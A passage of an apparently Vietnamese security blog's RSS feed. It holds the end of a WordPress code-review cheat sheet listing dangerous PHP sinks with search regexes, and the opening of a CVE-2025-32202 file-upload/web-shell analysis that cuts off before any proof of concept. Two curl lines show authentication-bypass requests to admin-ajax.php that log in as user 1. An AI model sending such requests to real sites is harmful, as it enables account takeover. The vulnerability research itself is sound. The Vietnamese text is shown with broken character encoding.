noreferrer&#34;&gt;&lt;code&gt;wp_delete_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_delete_file_from_directory/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_delete_file_from_directory&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-delete&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::delete&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-rmdir&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::rmdir&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(wp_delete_file|wp_delete_file_from_directory|WP_Filesystem_Direct::delete|WP_Filesystem_Direct::rmdir)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;php-object-injection&#34;&gt;&lt;span&gt;PHP Object Injection&lt;/span&gt;&#xA;  &lt;a href=&#34;#php-object-injection&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.unserialize.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unserialize&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/maybe_unserialize/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;maybe_unserialize&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(unserialize|maybe_unserialize)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;remote-code-execution-rce&#34;&gt;&lt;span&gt;Remote Code Execution (RCE)&lt;/span&gt;&#xA;  &lt;a href=&#34;#remote-code-execution-rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.system.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;system&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;exec&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.shell-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;shell_exec&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.passthru.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;passthru&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.proc-open.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;proc_open&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.eval.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;eval&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.call-user-func.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;call_user_func&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.call-user-func-array.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.create-function.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;create_function&lt;/code&gt;&lt;/a&gt; *(DEPRECATED t·ª´ PHP 7.2.0, REMOVED t·ª´ PHP 8.0.0)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(system|exec|shell_exec|passthru|proc_open|eval|call_user_func|call_user_func_array|create_function)\b&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;\$\w&amp;#43;\(&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;broken-access-control-rce&#34;&gt;&lt;span&gt;Broken Access Control (RCE)&lt;/span&gt;&#xA;  &lt;a href=&#34;#broken-access-control-rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#init-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;init&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#admin_init-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;admin_init&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#wp_ajax_action-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_ajax_&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#wp_ajax_nopriv_action-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_ajax_nopriv_&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/functions/#register_rest_route-function&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;register_rest_route&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;(add_action|do_action)\s*\(\s*[&amp;#39;&amp;#34;]?(init|admin_init|wp_ajax_[\w-]&amp;#43;|wp_ajax_nopriv_[\w-]&amp;#43;)[&amp;#39;&amp;#34;]?|register_rest_route\s*\(|permission_callback|current_user_can|wp_verify_nonce|is_user_logged_in&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;privilege-escalation&#34;&gt;&lt;span&gt;Privilege Escalation&lt;/span&gt;&#xA;  &lt;a href=&#34;#privilege-escalation&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/update_option/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;update_option&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;users_can_register&lt;/code&gt;: Quy·∫øt ƒë·ªãnh c√≥ cho ph√©p ng∆∞·ªùi d√πng t·ª± ƒëƒÉng k√Ω t√†i kho·∫£n hay kh√¥ng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;default_role&lt;/code&gt;: Quy·∫øt ƒë·ªãnh quy·ªÅn m·∫∑c ƒë·ªãnh c·ªßa ng∆∞·ªùi d√πng m·ªõi&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/update_user_meta/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;update_user_meta&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_users&lt;/code&gt;: ch·ªâ ch·ª©a th√¥ng tin c∆° b·∫£n (username, email, password‚Ä¶)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_usermeta&lt;/code&gt;: l∆∞u m·ªçi th√¥ng tin m·ªü r·ªông c·ªßa user&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_capabilities&lt;/code&gt;: N√≥ l∆∞u vai tr√≤ (role) c·ªßa user&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_insert_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_insert_user&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: quy·∫øt ƒë·ªãnh quy·ªÅn c·ªßa user.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_update_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_update_user&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: quy·∫øt ƒë·ªãnh quy·ªÅn c·ªßa user.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_password/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_set_password&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_set_auth_cookie&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl &amp;lt;WORDPRESS_BASE_URL&amp;gt;/wp-admin/admin-ajax.php?action=configure_platform_callback -d &amp;#34;user_id=1&amp;amp;fbid=1337&amp;#34;&#xA;curl &amp;lt;WORDPRESS_BASE_URL&amp;gt;/wp-admin/admin-ajax.php?action=login_third_party?fb-login=1&amp;amp;fbid=1337&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_current_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_set_current_user&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;set_role&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;(update_option|update_user_meta|wp_insert_user|wp_update_user|wp_set_password|wp_set_auth_cookie|wp_set_current_user|set_role)\s*\(&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32202 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/</link>
      <pubDate>Wed, 12 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong Brian Batt - elearningfreak.com ƒë·ªëi v·ªõi plugin &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; cho ph√©p t·∫£i l√™n m·ªôt &lt;strong&gt;Web Shell&lt;/strong&gt; l√™n m√°y ch·ªß web. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt;: t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;4.3000000025&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32202&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32202&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3000000025&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3000000026&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Articulate Content into WordPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Embed Articulate Content into WordPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000025&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000026&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;articulate_has_php_file()&lt;/code&gt; t·∫°i &lt;code&gt;/wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php&lt;/code&gt; do ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß, cho ph√©p attacker t·∫£i l√™n file &lt;code&gt;.htaccess&lt;/code&gt; nh·∫±m ghi ƒë√® c∆° ch·∫ø x·ª≠ l√Ω trong th∆∞ m·ª•c upload; k·∫øt qu·∫£ l√† c√°c file upload sau ƒë√≥ v·ªõi ph·∫ßn m·ªü r·ªông do attacker ƒë·∫∑t (v√≠ d·ª• &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) c√≥ th·ªÉ th·ª±c thi nh∆∞ file PHP.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#34; title=&#34;Th√™m ƒëi·ªÅu ki·ªán ki·ªÉm tra .htaccess&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/add_check.png&#34; data-sub-html=&#34;&lt;h2&gt;Add .htaccess&lt;/h2&gt;&lt;p&gt;Th√™m ƒëi·ªÅu ki·ªán ki·ªÉm tra .htaccess&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#39; alt=&#34;Add .htaccess&#34; height=&#34;528&#34; width=&#34;1887&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Th√™m ƒëi·ªÅu ki·ªán ki·ªÉm tra .htaccess&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ th√™m ƒëi·ªÅu ki·ªán check &lt;code&gt;.htaccess&lt;/code&gt; khi upload file gi√∫p ngƒÉn ch·∫∑n l·ªó h·ªïng x·∫£y ra.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng 